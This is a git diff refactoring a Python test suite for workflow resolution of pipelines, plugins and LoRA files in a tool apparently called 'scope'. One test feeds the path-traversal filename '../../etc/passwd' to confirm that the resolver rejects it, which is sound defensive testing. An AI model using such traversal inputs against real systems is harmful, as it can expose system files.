@@ -20,16 +20,19 @@ from scope.core.workflows.resolve import (
 # ---------------------------------------------------------------------------
 
 
+def make_pipeline(
+    pid="test_pipe", source_type="builtin", loras=None, **source_kw
+) -> WorkflowPipeline:
+    return WorkflowPipeline(
+        pipeline_id=pid,
+        source=WorkflowPipelineSource(type=source_type, **source_kw),
+        loras=loras or [],
+    )
+
+
 def make_workflow(**overrides) -> WorkflowRequest:
     """Build a minimal valid WorkflowRequest for tests."""
-    defaults = {
-        "pipelines": [
-            WorkflowPipeline(
-                pipeline_id="test_pipe",
-                source=WorkflowPipelineSource(type="builtin"),
-            )
-        ],
-    }
+    defaults = {"pipelines": [make_pipeline()]}
     defaults.update(overrides)
     return WorkflowRequest(**defaults)
 
@@ -38,6 +41,10 @@ def mock_plugin_manager(plugins: list[dict] | None = None) -> MagicMock:
     pm = MagicMock()
     pm.list_plugins_sync.return_value = plugins or []
     return pm
+
+
+def items_by_kind(plan, kind: str):
+    return [i for i in plan.items if i.kind == kind]
 
 
 # ---------------------------------------------------------------------------
@@ -50,24 +57,21 @@ class TestResolveBuiltinPipeline:
     def test_all_ok(self, mock_registry, tmp_path):
         mock_registry.is_registered.return_value = True
 
-        wf = make_workflow()
-        plan = resolve_workflow(wf, mock_plugin_manager(), tmp_path)
+        plan = resolve_workflow(make_workflow(), mock_plugin_manager(), tmp_path)
 
         assert plan.can_apply is True
-        pipeline_items = [i for i in plan.items if i.kind == "pipeline"]
-        assert len(pipeline_items) == 1
-        assert pipeline_items[0].status == "ok"
+        pipelines = items_by_kind(plan, "pipeline")
+        assert len(pipelines) == 1
+        assert pipelines[0].status == "ok"
 
     @patch("scope.core.pipelines.registry.PipelineRegistry")
     def test_missing_builtin(self, mock_registry, tmp_path):
         mock_registry.is_registered.return_value = False
 
-        wf = make_workflow()
-        plan = resolve_workflow(wf, mock_plugin_manager(), tmp_path)
+        plan = resolve_workflow(make_workflow(), mock_plugin_manager(), tmp_path)
 
         assert plan.can_apply is False
-        pipeline_items = [i for i in plan.items if i.kind == "pipeline"]
-        assert pipeline_items[0].status == "missing"
+        assert items_by_kind(plan, "pipeline")[0].status == "missing"
 
 
 class TestResolvePlugin:
@@ -77,13 +81,11 @@ class TestResolvePlugin:
 
         wf = make_workflow(
             pipelines=[
-                WorkflowPipeline(
-                    pipeline_id="face-swap",
-                    source=WorkflowPipelineSource(
-                        type="pypi",
-                        plugin_name="scope-deeplivecam",
-                        plugin_version="0.1.0",
-                    ),
+                make_pipeline(
+                    "face-swap",
+                    "pypi",
+                    plugin_name="scope-deeplivecam",
+                    plugin_version="0.1.0",
                 )
             ]
         )
@@ -91,11 +93,11 @@ class TestResolvePlugin:
         plan = resolve_workflow(wf, mock_plugin_manager(), tmp_path)
 
         assert plan.can_apply is False
-        plugin_items = [i for i in plan.items if i.kind == "plugin"]
-        assert len(plugin_items) == 1
-        assert plugin_items[0].status == "missing"
-        assert plugin_items[0].can_auto_resolve is True
-        assert "scope-deeplivecam" in plugin_items[0].action
+        plugins = items_by_kind(plan, "plugin")
+        assert len(plugins) == 1
+        assert plugins[0].status == "missing"
+        assert plugins[0].can_auto_resolve is True
+        assert "scope-deeplivecam" in plugins[0].action
 
     @patch("scope.core.pipelines.registry.PipelineRegistry")
     def test_plugin_installed_ok(self, mock_registry, tmp_path):
@@ -103,13 +105,11 @@ class TestResolvePlugin:
 
         wf = make_workflow(
             pipelines=[
-                WorkflowPipeline(
-                    pipeline_id="face-swap",
-                    source=WorkflowPipelineSource(
-                        type="pypi",
-                        plugin_name="scope-deeplivecam",
-                        plugin_version="0.1.0",
-                    ),
+                make_pipeline(
+                    "face-swap",
+                    "pypi",
+                    plugin_name="scope-deeplivecam",
+                    plugin_version="0.1.0",
                 )
             ]
         )
@@ -118,8 +118,7 @@ class TestResolvePlugin:
         plan = resolve_workflow(wf, pm, tmp_path)
 
         assert plan.can_apply is True
-        plugin_items = [i for i in plan.items if i.kind == "plugin"]
-        assert plugin_items[0].status == "ok"
+        assert items_by_kind(plan, "plugin")[0].status == "ok"
 
     @patch("scope.core.pipelines.registry.PipelineRegistry")
     def test_plugin_version_mismatch(self, mock_registry, tmp_path):
@@ -127,13 +126,11 @@ class TestResolvePlugin:
 
         wf = make_workflow(
             pipelines=[
-                WorkflowPipeline(
-                    pipeline_id="face-swap",
-                    source=WorkflowPipelineSource(
-                        type="pypi",
-                        plugin_name="scope-deeplivecam",
-                        plugin_version="2.0.0",
-                    ),
+                make_pipeline(
+                    "face-swap",
+                    "pypi",
+                    plugin_name="scope-deeplivecam",
+                    plugin_version="2.0.0",
                 )
             ]
         )
@@ -141,9 +138,10 @@ class TestResolvePlugin:
 
         plan = resolve_workflow(wf, pm, tmp_path)
 
-        plugin_items = [i for i in plan.items if i.kind == "plugin"]
-        assert plugin_items[0].status == "version_mismatch"
-        assert plugin_items[0].can_auto_resolve is True
+        assert plan.can_apply is False
+        plugin = items_by_kind(plan, "plugin")[0]
+        assert plugin.status == "version_mismatch"
+        assert plugin.can_auto_resolve is True
 
 
 class TestResolveLoRA:
@@ -156,53 +154,38 @@ class TestResolveLoRA:
         (lora_dir / "test.safetensors").write_bytes(b"fake")
 
         wf = make_workflow(
-            pipelines=[
-                WorkflowPipeline(
-                    pipeline_id="test_pipe",
-                    source=WorkflowPipelineSource(type="builtin"),
-                    loras=[WorkflowLoRA(filename="test.safetensors")],
-                )
-            ]
+            pipelines=[make_pipeline(loras=[WorkflowLoRA(filename="test.safetensors")])]
         )
 
         plan = resolve_workflow(wf, mock_plugin_manager(), tmp_path)
-        lora_items = [i for i in plan.items if i.kind == "lora"]
-        assert lora_items[0].status == "ok"
+        assert items_by_kind(plan, "lora")[0].status == "ok"
 
     @patch("scope.core.pipelines.registry.PipelineRegistry")
     def test_lora_missing_no_provenance(self, mock_registry, tmp_path):
         mock_registry.is_registered.return_value = True
-
         (tmp_path / "lora").mkdir()
 
         wf = make_workflow(
             pipelines=[
-                WorkflowPipeline(
-                    pipeline_id="test_pipe",
-                    source=WorkflowPipelineSource(type="builtin"),
-                    loras=[WorkflowLoRA(filename="missing.safetensors")],
-                )
+                make_pipeline(loras=[WorkflowLoRA(filename="missing.safetensors")])
             ]
         )
 
         plan = resolve_workflow(wf, mock_plugin_manager(), tmp_path)
 
         assert plan.can_apply is True  # missing LoRAs don't block
-        lora_items = [i for i in plan.items if i.kind == "lora"]
-        assert lora_items[0].status == "missing"
-        assert lora_items[0].can_auto_resolve is False
+        lora = items_by_kind(plan, "lora")[0]
+        assert lora.status == "missing"
+        assert lora.can_auto_resolve is False
 
     @patch("scope.core.pipelines.registry.PipelineRegistry")
     def test_lora_missing_with_provenance(self, mock_registry, tmp_path):
         mock_registry.is_registered.return_value = True
-
         (tmp_path / "lora").mkdir()
 
         wf = make_workflow(
             pipelines=[
-                WorkflowPipeline(
-                    pipeline_id="test_pipe",
-                    source=WorkflowPipelineSource(type="builtin"),
+                make_pipeline(
                     loras=[
                         WorkflowLoRA(
                             filename="arcane.safetensors",
@@ -211,17 +194,16 @@ class TestResolveLoRA:
                                 repo_id="user/arcane-lora",
                             ),
                         )
-                    ],
+                    ]
                 )
             ]
         )
 
         plan = resolve_workflow(wf, mock_plugin_manager(), tmp_path)
-
-        lora_items = [i for i in plan.items if i.kind == "lora"]
-        assert lora_items[0].status == "missing"
-        assert lora_items[0].can_auto_resolve is True
-        assert "HuggingFace" in lora_items[0].action
+        lora = items_by_kind(plan, "lora")[0]
+        assert lora.status == "missing"
+        assert lora.can_auto_resolve is True
+        assert "HuggingFace" in lora.action
 
 
 # ---------------------------------------------------------------------------
@@ -235,22 +217,14 @@ class TestResolvePluginEdgeCases:
         """Non-builtin pipeline with no plugin_name is marked missing."""
         mock_registry.is_registered.return_value = False
 
-        wf = make_workflow(
-            pipelines=[
-                WorkflowPipeline(
-                    pipeline_id="unknown-pipe",
-                    source=WorkflowPipelineSource(type="pypi"),
-                )
-            ]
-        )
+        wf = make_workflow(pipelines=[make_pipeline("unknown-pipe", "pypi")])
 
         plan = resolve_workflow(wf, mock_plugin_manager(), tmp_path)
 
         assert plan.can_apply is False
-        plugin_items = [i for i in plan.items if i.kind == "plugin"]
-        assert len(plugin_items) == 1
-        assert plugin_items[0].status == "missing"
-        assert "No plugin name" in plugin_items[0].detail
+        plugin = items_by_kind(plan, "plugin")[0]
+        assert plugin.status == "missing"
+        assert "No plugin name" in plugin.detail
 
     @patch("scope.core.pipelines.registry.PipelineRegistry")
     def test_missing_plugin_git_source(self, mock_registry, tmp_path):
@@ -259,23 +233,20 @@ class TestResolvePluginEdgeCases:
 
         wf = make_workflow(
             pipelines=[
-                WorkflowPipeline(
-                    pipeline_id="face-swap",
-                    source=WorkflowPipelineSource(
-                        type="git",
-                        plugin_name="scope-deeplivecam",
-                        package_spec="git+https://github.com/example/scope-deeplivecam.git",
-                    ),
+                make_pipeline(
+                    "face-swap",
+                    "git",
+                    plugin_name="scope-deeplivecam",
+                    package_spec="git+https://github.com/example/scope-deeplivecam.git",
                 )
             ]
         )
 
         plan = resolve_workflow(wf, mock_plugin_manager(), tmp_path)
-
-        plugin_items = [i for i in plan.items if i.kind == "plugin"]
-        assert plugin_items[0].status == "missing"
-        assert "Install from git:" in plugin_items[0].action
-        assert "github.com" in plugin_items[0].action
+        plugin = items_by_kind(plan, "plugin")[0]
+        assert plugin.status == "missing"
+        assert "Install from git:" in plugin.action
+        assert "github.com" in plugin.action
 
     @patch("scope.core.pipelines.registry.PipelineRegistry")
     def test_invalid_version_treated_as_ok(self, mock_registry, tmp_path):
@@ -284,13 +255,11 @@ class TestResolvePluginEdgeCases:
 
         wf = make_workflow(
             pipelines=[
-                WorkflowPipeline(
-                    pipeline_id="face-swap",
-                    source=WorkflowPipelineSource(
-                        type="pypi",
-                        plugin_name="scope-deeplivecam",
-                        plugin_version="1.0.0",
-                    ),
+                make_pipeline(
+                    "face-swap",
+                    "pypi",
+                    plugin_name="scope-deeplivecam",
+                    plugin_version="1.0.0",
                 )
             ]
         )
@@ -299,10 +268,9 @@ class TestResolvePluginEdgeCases:
         )
 
         plan = resolve_workflow(wf, pm, tmp_path)
-
-        plugin_items = [i for i in plan.items if i.kind == "plugin"]
-        assert plugin_items[0].status == "ok"
-        assert "Could not compare versions" in plugin_items[0].detail
+        plugin = items_by_kind(plan, "plugin")[0]
+        assert plugin.status == "ok"
+        assert "Could not compare versions" in plugin.detail
 
     @patch("scope.core.pipelines.registry.PipelineRegistry")
     def test_plugin_no_version_info(self, mock_registry, tmp_path):
@@ -311,13 +279,7 @@ class TestResolvePluginEdgeCases:
 
         wf = make_workflow(
             pipelines=[
-                WorkflowPipeline(
-                    pipeline_id="face-swap",
-                    source=WorkflowPipelineSource(
-                        type="pypi",
-                        plugin_name="scope-deeplivecam",
-                    ),
-                )
+                make_pipeline("face-swap", "pypi", plugin_name="scope-deeplivecam")
             ]
         )
         pm = mock_plugin_manager([{"name": "scope-deeplivecam"}])
@@ -325,9 +287,9 @@ class TestResolvePluginEdgeCases:
         plan = resolve_workflow(wf, pm, tmp_path)
 
         assert plan.can_apply is True
-        plugin_items = [i for i in plan.items if i.kind == "plugin"]
-        assert plugin_items[0].status == "ok"
-        assert plugin_items[0].detail is None
+        plugin = items_by_kind(plan, "plugin")[0]
+        assert plugin.status == "ok"
+        assert plugin.detail is None
 
 
 # ---------------------------------------------------------------------------
@@ -340,14 +302,11 @@ class TestResolveLoRAProvenance:
     def test_missing_lora_civitai_provenance(self, mock_registry, tmp_path):
         """CivitAI provenance generates correct action string."""
         mock_registry.is_registered.return_value = True
-
         (tmp_path / "lora").mkdir()
 
         wf = make_workflow(
             pipelines=[
-                WorkflowPipeline(
-                    pipeline_id="test_pipe",
-                    source=WorkflowPipelineSource(type="builtin"),
+                make_pipeline(
                     loras=[
                         WorkflowLoRA(
                             filename="style.safetensors",
@@ -356,31 +315,27 @@ class TestResolveLoRAProvenance:
                                 model_id="12345",
                             ),
                         )
-                    ],
+                    ]
                 )
             ]
         )
 
         plan = resolve_workflow(wf, mock_plugin_manager(), tmp_path)
-
-        lora_items = [i for i in plan.items if i.kind == "lora"]
-        assert lora_items[0].status == "missing"
-        assert lora_items[0].can_auto_resolve is True
-        assert "CivitAI" in lora_items[0].action
-        assert "12345" in lora_items[0].action
+        lora = items_by_kind(plan, "lora")[0]
+        assert lora.status == "missing"
+        assert lora.can_auto_resolve is True
+        assert "CivitAI" in lora.action
+        assert "12345" in lora.action
 
     @patch("scope.core.pipelines.registry.PipelineRegistry")
     def test_missing_lora_url_provenance_with_url(self, mock_registry, tmp_path):
         """URL provenance with a url field uses that URL in the action."""
         mock_registry.is_registered.return_value = True
-
         (tmp_path / "lora").mkdir()
 
         wf = make_workflow(
             pipelines=[
-                WorkflowPipeline(
-                    pipeline_id="test_pipe",
-                    source=WorkflowPipelineSource(type="builtin"),
+                make_pipeline(
                     loras=[
                         WorkflowLoRA(
                             filename="custom.safetensors",
@@ -389,44 +344,39 @@ class TestResolveLoRAProvenance:
                                 url="https://example.com/lora.safetensors",
                             ),
                         )
-                    ],
+                    ]
                 )
             ]
         )
 
         plan = resolve_workflow(wf, mock_plugin_manager(), tmp_path)
-
-        lora_items = [i for i in plan.items if i.kind == "lora"]
-        assert lora_items[0].can_auto_resolve is True
-        assert "example.com" in lora_items[0].action
+        lora = items_by_kind(plan, "lora")[0]
+        assert lora.can_auto_resolve is True
+        assert "example.com" in lora.action
 
     @patch("scope.core.pipelines.registry.PipelineRegistry")
     def test_missing_lora_url_provenance_without_url(self, mock_registry, tmp_path):
         """URL provenance without a url field falls back to generic action."""
         mock_registry.is_registered.return_value = True
-
         (tmp_path / "lora").mkdir()
 
         wf = make_workflow(
             pipelines=[
-                WorkflowPipeline(
-                    pipeline_id="test_pipe",
-                    source=WorkflowPipelineSource(type="builtin"),
+                make_pipeline(
                     loras=[
                         WorkflowLoRA(
                             filename="custom.safetensors",
                             provenance=WorkflowLoRAProvenance(source="url"),
                         )
-                    ],
+                    ]
                 )
             ]
         )
 
         plan = resolve_workflow(wf, mock_plugin_manager(), tmp_path)
-
-        lora_items = [i for i in plan.items if i.kind == "lora"]
-        assert lora_items[0].can_auto_resolve is True
-        assert lora_items[0].action == "Download from source"
+        lora = items_by_kind(plan, "lora")[0]
+        assert lora.can_auto_resolve is True
+        assert lora.action == "Download from source"
 
     @patch("scope.core.pipelines.registry.PipelineRegistry")
     def test_missing_lora_local_provenance_not_auto_resolvable(
@@ -434,30 +384,26 @@ class TestResolveLoRAProvenance:
     ):
         """Local provenance is treated as no provenance (not auto-resolvable)."""
         mock_registry.is_registered.return_value = True
-
         (tmp_path / "lora").mkdir()
 
         wf = make_workflow(
             pipelines=[
-                WorkflowPipeline(
-                    pipeline_id="test_pipe",
-                    source=WorkflowPipelineSource(type="builtin"),
+                make_pipeline(
                     loras=[
                         WorkflowLoRA(
                             filename="local.safetensors",
                             provenance=WorkflowLoRAProvenance(source="local"),
                         )
-                    ],
+                    ]
                 )
             ]
         )
 
         plan = resolve_workflow(wf, mock_plugin_manager(), tmp_path)
-
-        lora_items = [i for i in plan.items if i.kind == "lora"]
-        assert lora_items[0].status == "missing"
-        assert lora_items[0].can_auto_resolve is False
-        assert lora_items[0].action is None
+        lora = items_by_kind(plan, "lora")[0]
+        assert lora.status == "missing"
+        assert lora.can_auto_resolve is False
+        assert lora.action is None
 
 
 # ---------------------------------------------------------------------------
@@ -473,54 +419,34 @@ class TestResolveMultiplePipelines:
 
         wf = make_workflow(
             pipelines=[
-                WorkflowPipeline(
-                    pipeline_id="test_pipe",
-                    source=WorkflowPipelineSource(type="builtin"),
-                ),
-                WorkflowPipeline(
-                    pipeline_id="face-swap",
-                    source=WorkflowPipelineSource(
-                        type="pypi",
-                        plugin_name="scope-deeplivecam",
-                    ),
-                ),
+                make_pipeline(),
+                make_pipeline("face-swap", "pypi", plugin_name="scope-deeplivecam"),
             ]
         )
 
         plan = resolve_workflow(wf, mock_plugin_manager(), tmp_path)
 
         assert plan.can_apply is False
-        pipeline_items = [i for i in plan.items if i.kind == "pipeline"]
-        plugin_items = [i for i in plan.items if i.kind == "plugin"]
-        assert len(pipeline_items) == 1
-        assert pipeline_items[0].status == "ok"
-        assert len(plugin_items) == 1
-        assert plugin_items[0].status == "missing"
+        pipelines = items_by_kind(plan, "pipeline")
+        plugins = items_by_kind(plan, "plugin")
+        assert len(pipelines) == 1
+        assert pipelines[0].status == "ok"
+        assert len(plugins) == 1
+        assert plugins[0].status == "missing"
 
     @patch("scope.core.pipelines.registry.PipelineRegistry")
     def test_multiple_pipelines_all_ok(self, mock_registry, tmp_path):
         """Multiple builtin pipelines all registered: can_apply is True."""
         mock_registry.is_registered.return_value = True
 
-        wf = make_workflow(
-            pipelines=[
-                WorkflowPipeline(
-                    pipeline_id="pipe_a",
-                    source=WorkflowPipelineSource(type="builtin"),
-                ),
-                WorkflowPipeline(
-                    pipeline_id="pipe_b",
-                    source=WorkflowPipelineSource(type="builtin"),
-                ),
-            ]
-        )
+        wf = make_workflow(pipelines=[make_pipeline("pipe_a"), make_pipeline("pipe_b")])
 
         plan = resolve_workflow(wf, mock_plugin_manager(), tmp_path)
 
         assert plan.can_apply is True
-        pipeline_items = [i for i in plan.items if i.kind == "pipeline"]
-        assert len(pipeline_items) == 2
-        assert all(i.status == "ok" for i in pipeline_items)
+        pipelines = items_by_kind(plan, "pipeline")
+        assert len(pipelines) == 2
+        assert all(i.status == "ok" for i in pipelines)
 
 
 # ---------------------------------------------------------------------------
@@ -580,40 +506,39 @@ class TestExtraFieldsIgnored:
 
 
 # ---------------------------------------------------------------------------
-# min_scope_version tests (moved from test_workflow_timeline.py)
+# min_scope_version tests
 # ---------------------------------------------------------------------------
 
 
 class TestMinScopeVersion:
-    """WorkflowRequest.min_scope_version field."""
-
     def test_default_is_none(self):
-        wf = make_workflow()
-        assert wf.min_scope_version is None
+        assert make_workflow().min_scope_version is None
 
     def test_round_trip(self):
         wf = make_workflow(min_scope_version="0.5.0")
-        data = wf.model_dump()
-        restored = WorkflowRequest.model_validate(data)
+        restored = WorkflowRequest.model_validate(wf.model_dump())
         assert restored.min_scope_version == "0.5.0"
 
     @patch("scope.core.pipelines.registry.PipelineRegistry")
     def test_resolve_warns_when_current_is_older(self, mock_registry, tmp_path):
-        """min_scope_version check produces a warning on resolve."""
         mock_registry.is_registered.return_value = True
 
-        wf = make_workflow(min_scope_version="99.0.0")
-        plan = resolve_workflow(wf, mock_plugin_manager(), tmp_path)
-
+        plan = resolve_workflow(
+            make_workflow(min_scope_version="99.0.0"),
+            mock_plugin_manager(),
+            tmp_path,
+        )
         assert any("99.0.0" in w for w in plan.warnings)
 
     @patch("scope.core.pipelines.registry.PipelineRegistry")
     def test_resolve_no_warning_when_version_ok(self, mock_registry, tmp_path):
         mock_registry.is_registered.return_value = True
 
-        wf = make_workflow(min_scope_version="0.0.1")
-        plan = resolve_workflow(wf, mock_plugin_manager(), tmp_path)
-
+        plan = resolve_workflow(
+            make_workflow(min_scope_version="0.0.1"),
+            mock_plugin_manager(),
+            tmp_path,
+        )
         assert not any("Scope >=" in w for w in plan.warnings)
 
     @patch("scope.core.pipelines.registry.PipelineRegistry")
@@ -621,7 +546,6 @@ class TestMinScopeVersion:
     def test_resolve_warns_when_package_not_found(
         self, mock_version, mock_registry, tmp_path
     ):
-        """PackageNotFoundError produces a warning."""
         import importlib.metadata
 
         mock_registry.is_registered.return_value = True
@@ -629,9 +553,11 @@ class TestMinScopeVersion:
             "daydream-scope"
         )
 
-        wf = make_workflow(min_scope_version="1.0.0")
-        plan = resolve_workflow(wf, mock_plugin_manager(), tmp_path)
-
+        plan = resolve_workflow(
+            make_workflow(min_scope_version="1.0.0"),
+            mock_plugin_manager(),
+            tmp_path,
+        )
         assert any("Could not verify" in w for w in plan.warnings)
 
 
@@ -643,93 +569,49 @@ class TestMinScopeVersion:
 class TestPathTraversal:
     @patch("scope.core.pipelines.registry.PipelineRegistry")
     def test_lora_path_traversal_rejected(self, mock_registry, tmp_path):
-        """LoRA filenames with path traversal components are rejected."""
         mock_registry.is_registered.return_value = True
-
-        lora_dir = tmp_path / "lora"
-        lora_dir.mkdir()
+        (tmp_path / "lora").mkdir()
 
         wf = make_workflow(
-            pipelines=[
-                WorkflowPipeline(
-                    pipeline_id="test_pipe",
-                    source=WorkflowPipelineSource(type="builtin"),
-                    loras=[WorkflowLoRA(filename="../../etc/passwd")],
-                )
-            ]
+            pipelines=[make_pipeline(loras=[WorkflowLoRA(filename="../../etc/passwd")])]
         )
 
         plan = resolve_workflow(wf, mock_plugin_manager(), tmp_path)
-
-        lora_items = [i for i in plan.items if i.kind == "lora"]
-        assert lora_items[0].status == "missing"
-        assert lora_items[0].detail == "Invalid LoRA filename"
-        assert lora_items[0].can_auto_resolve is False
+        lora = items_by_kind(plan, "lora")[0]
+        assert lora.status == "missing"
+        assert lora.detail == "Invalid LoRA filename"
+        assert lora.can_auto_resolve is False
 
     @patch("scope.core.pipelines.registry.PipelineRegistry")
     def test_lora_normal_filename_ok(self, mock_registry, tmp_path):
-        """Normal filenames still work after path traversal guard."""
         mock_registry.is_registered.return_value = True
-
         lora_dir = tmp_path / "lora"
         lora_dir.mkdir()
         (lora_dir / "valid.safetensors").write_bytes(b"data")
 
         wf = make_workflow(
             pipelines=[
-                WorkflowPipeline(
-                    pipeline_id="test_pipe",
-                    source=WorkflowPipelineSource(type="builtin"),
-                    loras=[WorkflowLoRA(filename="valid.safetensors")],
-                )
+                make_pipeline(loras=[WorkflowLoRA(filename="valid.safetensors")])
             ]
         )
 
         plan = resolve_workflow(wf, mock_plugin_manager(), tmp_path)
-
-        lora_items = [i for i in plan.items if i.kind == "lora"]
-        assert lora_items[0].status == "ok"
+        assert items_by_kind(plan, "lora")[0].status == "ok"
 
 
 # ---------------------------------------------------------------------------
-# Empty pipelines + version_mismatch can_apply tests
+# Empty pipelines
 # ---------------------------------------------------------------------------
 
 
 class TestEdgeCases:
     @patch("scope.core.pipelines.registry.PipelineRegistry")
     def test_empty_pipelines(self, mock_registry, tmp_path):
-        """Empty pipelines list resolves with can_apply=True and no items."""
         wf = WorkflowRequest(pipelines=[])
         plan = resolve_workflow(wf, mock_plugin_manager(), tmp_path)
 
         assert plan.can_apply is True
         assert plan.items == []
-
-    @patch("scope.core.pipelines.registry.PipelineRegistry")
-    def test_version_mismatch_blocks_can_apply(self, mock_registry, tmp_path):
-        """Plugin version_mismatch sets can_apply=False."""
-        mock_registry.is_registered.return_value = True
-
-        wf = make_workflow(
-            pipelines=[
-                WorkflowPipeline(
-                    pipeline_id="face-swap",
-                    source=WorkflowPipelineSource(
-                        type="pypi",
-                        plugin_name="scope-deeplivecam",
-                        plugin_version="2.0.0",
-                    ),
-                )
-            ]
-        )
-        pm = mock_plugin_manager([{"name": "scope-deeplivecam", "version": "0.1.0"}])
-
-        plan = resolve_workflow(wf, pm, tmp_path)
-
-        plugin_items = [i for i in plan.items if i.kind == "plugin"]
-        assert plugin_items[0].status == "version_mismatch"
-        assert plan.can_apply is False
 
 
 # ---------------------------------------------------------------------------
@@ -739,33 +621,23 @@ class TestEdgeCases:
 
 class TestInputValidation:
     def test_lora_filename_max_length(self):
-        """LoRA filename exceeding max_length is rejected."""
         from pydantic import ValidationError
 
         with pytest.raises(ValidationError):
             WorkflowLoRA(filename="a" * 256)
 
     def test_lora_filename_at_max_length(self):
-        """LoRA filename at max_length is accepted."""
         lora = WorkflowLoRA(filename="a" * 255)
         assert len(lora.filename) == 255
 
     def test_too_many_pipelines_rejected(self):
-        """WorkflowRequest with >50 pipelines is rejected."""
         from pydantic import ValidationError
 
-        pipelines = [
-            WorkflowPipeline(
-                pipeline_id=f"pipe_{i}",
-                source=WorkflowPipelineSource(type="builtin"),
-            )
-            for i in range(51)
-        ]
+        pipelines = [make_pipeline(f"pipe_{i}") for i in range(51)]
         with pytest.raises(ValidationError):
             WorkflowRequest(pipelines=pipelines)
 
     def test_too_many_loras_rejected(self):
-        """WorkflowPipeline with >100 LoRAs is rejected."""
         from pydantic import ValidationError
 
         loras = [WorkflowLoRA(filename=f"lora_{i}.safetensors") for i in range(101)]
@@ -783,8 +655,6 @@ class TestInputValidation:
 
 
 class TestPluginManagerFailures:
-    """What happens when the plugin manager itself breaks?"""
-
     @patch("scope.core.pipelines.registry.PipelineRegistry")
     def test_plugin_manager_throws_degrades_gracefully(self, mock_registry, tmp_path):
         """list_plugins_sync() crash is caught; plugins treated as missing."""
@@ -793,118 +663,82 @@ class TestPluginManagerFailures:
         pm.list_plugins_sync.side_effect = RuntimeError("metadata corrupted")
 
         wf = make_workflow(
-            pipelines=[
-                WorkflowPipeline(
-                    pipeline_id="test",
-                    source=WorkflowPipelineSource(
-                        type="pypi", plugin_name="some-plugin"
-                    ),
-                )
-            ]
+            pipelines=[make_pipeline("test", "pypi", plugin_name="some-plugin")]
         )
 
         plan = resolve_workflow(wf, pm, tmp_path)
         assert plan.can_apply is False
         assert any("Could not read installed plugins" in w for w in plan.warnings)
-        plugin_items = [i for i in plan.items if i.kind == "plugin"]
-        assert plugin_items[0].status == "missing"
+        assert items_by_kind(plan, "plugin")[0].status == "missing"
 
 
 class TestVersionComparisonGaps:
-    """Edge cases in version comparison logic."""
-
     @patch("scope.core.pipelines.registry.PipelineRegistry")
     def test_workflow_requires_version_but_installed_has_none(
         self, mock_registry, tmp_path
     ):
-        """Plugin installed without version metadata, workflow requires >=2.0.
-
-        Returns status="ok" (non-blocking) but includes a detail warning
-        so the user knows version could not be verified.
-        """
+        """Plugin installed without version metadata: ok with detail warning."""
         mock_registry.is_registered.return_value = True
-        pm = mock_plugin_manager([{"name": "scope-stylize"}])  # no version key
+        pm = mock_plugin_manager([{"name": "scope-stylize"}])
 
         wf = make_workflow(
             pipelines=[
-                WorkflowPipeline(
-                    pipeline_id="stylize",
-                    source=WorkflowPipelineSource(
-                        type="pypi",
-                        plugin_name="scope-stylize",
-                        plugin_version="2.0.0",
-                    ),
+                make_pipeline(
+                    "stylize",
+                    "pypi",
+                    plugin_name="scope-stylize",
+                    plugin_version="2.0.0",
                 )
             ]
         )
 
         plan = resolve_workflow(wf, pm, tmp_path)
-        plugin_items = [i for i in plan.items if i.kind == "plugin"]
-
-        assert plugin_items[0].status == "ok"
-        assert "Could not verify version" in plugin_items[0].detail
+        plugin = items_by_kind(plan, "plugin")[0]
+        assert plugin.status == "ok"
+        assert "Could not verify version" in plugin.detail
 
     @patch("scope.core.pipelines.registry.PipelineRegistry")
     def test_same_plugin_conflicting_versions_across_pipelines(
         self, mock_registry, tmp_path
     ):
         """Two pipelines require same plugin at different versions.
-
-        Installed 1.5.0: pipeline A (>=1.0) ok, pipeline B (>=2.0) mismatch.
-        Same plugin appears in the plan with contradictory statuses.
-
-        Known limitation: no dedup or conflict detection. The UI shows both
-        items and can_apply=False if any mismatch, which is acceptable.
-        """
+        Installed 1.5.0: pipeline A (>=1.0) ok, pipeline B (>=2.0) mismatch."""
         mock_registry.is_registered.return_value = True
         pm = mock_plugin_manager([{"name": "scope-fx", "version": "1.5.0"}])
 
         wf = make_workflow(
             pipelines=[
-                WorkflowPipeline(
-                    pipeline_id="fx-v1",
-                    source=WorkflowPipelineSource(
-                        type="pypi",
-                        plugin_name="scope-fx",
-                        plugin_version="1.0.0",
-                    ),
+                make_pipeline(
+                    "fx-v1",
+                    "pypi",
+                    plugin_name="scope-fx",
+                    plugin_version="1.0.0",
                 ),
-                WorkflowPipeline(
-                    pipeline_id="fx-v2",
-                    source=WorkflowPipelineSource(
-                        type="pypi",
-                        plugin_name="scope-fx",
-                        plugin_version="2.0.0",
-                    ),
+                make_pipeline(
+                    "fx-v2",
+                    "pypi",
+                    plugin_name="scope-fx",
+                    plugin_version="2.0.0",
                 ),
             ]
         )
 
         plan = resolve_workflow(wf, pm, tmp_path)
-        plugin_items = [i for i in plan.items if i.kind == "plugin"]
-
-        # Same plugin, contradictory statuses
-        assert len(plugin_items) == 2
-        assert plugin_items[0].status == "ok"
-        assert plugin_items[1].status == "version_mismatch"
+        plugins = items_by_kind(plan, "plugin")
+        assert len(plugins) == 2
+        assert plugins[0].status == "ok"
+        assert plugins[1].status == "version_mismatch"
         assert plan.can_apply is False
 
 
 class TestDegenerateInputs:
-    """Empty strings, missing fields, weird shapes."""
-
     def test_empty_pipeline_id_rejected(self):
-        """Empty string pipeline_id is rejected by Pydantic validation."""
         from pydantic import ValidationError
 
         with pytest.raises(ValidationError):
-            WorkflowPipeline(
-                pipeline_id="",
-                source=WorkflowPipelineSource(type="builtin"),
-            )
+            make_pipeline(pid="")
 
     def test_empty_plugin_name_rejected(self):
-        """Empty string plugin_name is rejected by Pydantic validation."""
         from pydantic import ValidationError
 
         with pytest.raises(ValidationError):
@@ -920,20 +754,17 @@ class TestDegenerateInputs:
 
         wf = make_workflow(
             pipelines=[
-                WorkflowPipeline(
-                    pipeline_id="test_pipe",
-                    source=WorkflowPipelineSource(type="builtin"),
+                make_pipeline(
                     loras=[
                         WorkflowLoRA(filename="style.safetensors"),
                         WorkflowLoRA(filename="style.safetensors"),
-                    ],
+                    ]
                 )
             ]
         )
 
         plan = resolve_workflow(wf, mock_plugin_manager(), tmp_path)
-        lora_items = [i for i in plan.items if i.kind == "lora"]
-        assert len(lora_items) == 2  # no dedup
+        assert len(items_by_kind(plan, "lora")) == 2
 
     @patch("scope.core.pipelines.registry.PipelineRegistry")
     def test_plugin_dict_missing_name_key(self, mock_registry, tmp_path):
@@ -942,20 +773,13 @@ class TestDegenerateInputs:
         pm = mock_plugin_manager([{"version": "1.0.0"}])
 
         wf = make_workflow(
-            pipelines=[
-                WorkflowPipeline(
-                    pipeline_id="test",
